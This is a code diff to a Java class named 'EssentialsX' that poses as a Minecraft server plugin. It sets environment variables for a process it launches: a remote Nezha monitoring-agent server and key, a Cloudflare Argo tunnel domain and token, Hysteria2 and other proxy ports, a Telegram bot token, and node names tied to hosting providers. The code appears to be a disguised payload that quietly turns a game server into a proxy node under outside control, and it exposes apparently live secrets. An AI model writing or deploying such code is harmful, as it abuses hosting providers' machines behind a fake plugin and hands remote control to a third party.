@@ -73,16 +73,16 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "2bf97231-577b-4984-9207-b7cc742b8e7b");
+        env.put("UUID", "61430a8b-312e-4bf7-af6c-0b5a2d051abb");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "bo66.pp.ua:8008");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "yZAEKJz2Skx8a1ovsIFNVG7hd81n2BpD");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "enderbit.boxu.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiYWI2MWM0MjAtOGE0ZC00MTgwLWJjZGMtM2Q1YTk2Nzk5OTBmIiwicyI6Ik1ERXdNakpoTkRjdE5qazFNaTAwTm1VMExUbGxOekl0WVRkaE1UVmpORGN3WW1OaCJ9");
+        env.put("ARGO_DOMAIN", "leonodes.boxu.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiZGZmNTYxN2QtOGFjMS00YjRiLWE4NGEtNmMwNmIwMmVmZGUzIiwicyI6Ik1XSmlNMlk1WkRRdE1Ua3lOeTAwTnpsaExUazRNVEl0WkRSak5ERmpaVEprTWpjdyJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25105");
+        env.put("HY2_PORT", "14303");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "8333285464:AAE9xFo7w51MclwGz-OA_vud9MC5N9RNRCQ");
         env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
-        env.put("NAME", "enderbit-au");
+        env.put("NAME", "mcserverhost-US");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
